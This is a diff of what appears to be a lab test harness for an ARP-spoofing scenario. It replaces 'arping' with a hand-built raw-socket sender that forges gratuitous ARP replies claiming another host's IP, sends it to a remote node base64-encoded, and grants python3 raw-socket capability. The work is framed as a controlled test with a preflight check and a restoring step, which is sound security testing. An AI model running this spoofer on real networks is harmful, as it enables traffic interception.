@@ -10,8 +10,11 @@ trusting routing-table defaults (see scripts/adversary-bind.py). Observed three 
 before and after. A corrective step always runs afterward, success or failure, so the Mac's cache is not left wrong when the run ends.
 
 Safety: refuses to send anything unless node-02's preflight() (adversary-bind.py) reports ok -- a leak risk on node-02 stops the run before the
-first packet. REPLY_COUNT is fixed and small (not a flood; that is scenario 4). Requires `sudo setcap cap_net_raw+ep /usr/bin/arping` to have
-been run once on node-02 (CAP_NET_RAW is a kernel requirement for raw ARP frames regardless of tool; this avoids needing sudo on every run).
+first packet. REPLY_COUNT is fixed and small (not a flood; that is scenario 4). The send itself is a hand-built Ethernet/ARP frame over a raw
+AF_PACKET socket (RAW_ARP_SEND below), not `arping`: `arping -A`/`-U` bind a socket to the CLAIMED address internally and refuse to send when
+the host does not own it (confirmed 2026-10-22, this scenario's first live attempt, in both modes), which is exactly what spoofing needs to do.
+Requires `sudo setcap cap_net_raw+ep /usr/bin/python3.13` (the exact interpreter path; CAP_NET_RAW is a kernel requirement for a raw socket and
+file capabilities do not transfer between binaries) to have been run once on node-02, so sudo is not needed on every run after that.
 
 Usage (run on the Mac, which is the target identity and the point of comparison):
     python3 scripts/track-c-scenario1-arp-spoof.py --out <results dir> [--dry-run]
@@ -130,6 +133,37 @@ p.wait(timeout=3)
 '''
 
 
+
+RAW_ARP_SEND = '''
+import socket, struct, sys, time
+iface, src_mac_hex, target_ip, count = sys.argv[1], sys.argv[2], sys.argv[3], int(sys.argv[4])
+src_mac = bytes.fromhex(src_mac_hex.replace(':', ''))
+target_ip_bytes = socket.inet_aton(target_ip)
+BROADCAST = b'\\xff' * 6
+eth_header = BROADCAST + src_mac + struct.pack('!H', 0x0806)  # dst=broadcast, src=our MAC, ethertype=ARP
+# htype=Ethernet(1), ptype=IPv4(0x0800), hlen=6, plen=4, oper=REPLY(2); sha/spa=our MAC/the CLAIMED address; tha=broadcast, tpa=the claimed
+# address too (gratuitous convention: tpa == spa). This is a hand-built L2 frame, not routed through the IP stack, so it can claim an address
+# this host does not itself own -- unlike `arping -A`/`-U`, which bind a socket to the claimed address internally and refuse exactly that.
+arp_payload = struct.pack('!HHBBH', 1, 0x0800, 6, 4, 2) + src_mac + target_ip_bytes + BROADCAST + target_ip_bytes
+frame = eth_header + arp_payload
+sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
+sock.bind((iface, 0))
+sent = 0
+partial = 0
+for _ in range(count):
+    n = sock.send(frame)
+    if n == len(frame):
+        sent += 1
+    else:
+        partial += 1  # sock.send() returned fewer bytes than the frame; do not count it as a real send (a 42-byte frame on a raw
+        #                socket should never short-write, but this is what "sent" actually claims, so it is checked rather than assumed)
+    if _ < count - 1:
+        time.sleep(0.3)
+sock.close()
+print(f"__TC1_SEND_RESULT__:{sent}" + (f" partial:{partial}" if partial else ""))
+'''
+
+
 def start_capture(iface: str, tag: str) -> int:
     """Starts the remote capture and returns its PID (printed as the first line), for a deterministic liveness check later -- not a
     name/interface guess, which a leftover or manually-started tcpdump on the same interface could satisfy by coincidence."""
@@ -176,12 +210,17 @@ def fetch_capture(tag: str) -> list:
 
 
 def frames_claiming(lines: list, target_ip: str, sender_mac: str) -> list:
-    """ARP replies in tcpdump -e output where the Ethernet source matches the adversary's MAC and the target_ip appears (SPA in a reply)."""
+    """ARP replies in tcpdump -e output where the Ethernet source matches the adversary's MAC and the target_ip appears (SPA in a reply).
+    Matches on tcpdump's own phrasing for a REPLY specifically: "<ip> is-at <mac>" (a REQUEST instead reads "who-has <ip> tell <ip>", with no
+    "is-at" at all). Confirmed against a real captured frame 2026-10-22: tcpdump's actual text is "... ethertype ARP (0x0806), length 60:
+    Reply 10.0.2.119 is-at b8:27:eb:79:ff:0a, length 46" -- the earlier check for the literal substring "ARP, Reply" never matched anything,
+    because "ARP" and "Reply" are not adjacent in real output; this was found and fixed only by inspecting an actual captured line, not by
+    reasoning about the format in advance."""
     hits = []
     for l in lines:
         if sender_mac.lower() not in l.lower():
             continue
-        if 'ARP, Reply' not in l and 'arp reply' not in l.lower():
+        if ' is-at ' not in l:
             continue
         if target_ip not in l:
             continue
@@ -222,7 +261,7 @@ def main() -> None:
     log(f'  ok: preflight passed, {NODE02_WORKLOAD_IFACE} is safe to send on')
 
     adversary_mac = run(NODE02, f"ip -o link show {NODE02_WORKLOAD_IFACE} | awk '{{print $(NF-2)}}'").strip()
-    result['adversaryEth0Mac'] = adversary_mac
+    result['adversaryWorkloadMac'] = adversary_mac  # the MAC stamped into the crafted frame; sent on NODE02_WORKLOAD_IFACE, not necessarily eth0
     log(f'  adversary {NODE02_WORKLOAD_IFACE} MAC: {adversary_mac}')
 
     log('step 2: baseline — the Mac\'s own ARP cache for the target, before anything is sent')
@@ -243,12 +282,14 @@ def main() -> None:
                 raise SystemExit(1)
         log(f'step 4: sending {reply_count} unsolicited ARP replies from the adversary, bound to {NODE02_WORKLOAD_IFACE}, claiming {TARGET_IP}')
         try:
-            out = run(NODE02, f'arping -A -I {NODE02_WORKLOAD_IFACE} -c {reply_count} -w 1 {TARGET_IP}; echo "__TC1_ARPING_EXIT__:$?"')
-            marker = next((l for l in out.splitlines() if l.startswith('__TC1_ARPING_EXIT__:')), None)
+            send_cmd = (f"echo {base64.b64encode(RAW_ARP_SEND.encode()).decode()} | base64 -d > /tmp/tc1-send.py && "
+                        f"python3 /tmp/tc1-send.py {NODE02_WORKLOAD_IFACE} {adversary_mac} {TARGET_IP} {reply_count}")
+            out = run(NODE02, send_cmd)
+            marker = next((l for l in out.splitlines() if l.startswith('__TC1_SEND_RESULT__:')), None)
             log(f'  {out.replace(marker, "").strip()[:400] if marker else out.strip()[:400]}')
-            result['sendOk'] = marker == '__TC1_ARPING_EXIT__:0'
+            result['sendOk'] = marker == f'__TC1_SEND_RESULT__:{reply_count}'
             if marker is None:
-                log('  WARNING: could not find the exit-code marker in arping\'s output; sendOk left False (fail closed, not assumed)')
+                log('  WARNING: could not find the expected result marker in the sender\'s output; sendOk left False (fail closed, not assumed)')
         except RuntimeError as err:
             log(f'  SEND FAILED: {err}')
             result['sendOk'] = False
